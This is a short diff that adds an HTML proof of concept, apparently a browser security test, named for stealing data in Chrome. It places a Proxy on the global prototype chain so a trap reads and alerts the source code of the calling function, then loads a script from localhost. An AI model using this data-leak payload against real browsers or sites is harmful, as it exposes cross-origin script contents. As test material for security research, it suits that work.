@@ -1,0 +1,10 @@
+<!doctype HTML>
+<script>
+__proto__.__proto__.__proto__.__proto__.__proto__=new Proxy(__proto__,{
+        has:function f(target,name){
+                var str = f.caller.toString();
+		alert(str);
+        }
+});
+</script>
+<script src="http://localhost:5001/chrome_steal_data_using_proxy/test.js"></script>
